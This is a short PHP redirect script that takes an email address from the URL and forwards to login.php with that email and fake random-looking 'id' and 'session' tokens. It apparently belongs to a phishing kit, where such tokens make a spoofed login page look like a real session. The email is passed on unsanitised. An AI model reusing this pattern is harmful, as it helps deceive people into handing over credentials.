<?php
	
	$praga=rand();
	$praga=md5($praga);
$email = $_GET['email'];
	header("location: login.php?email=$email&id=$praga$praga&session=$praga$praga");

?>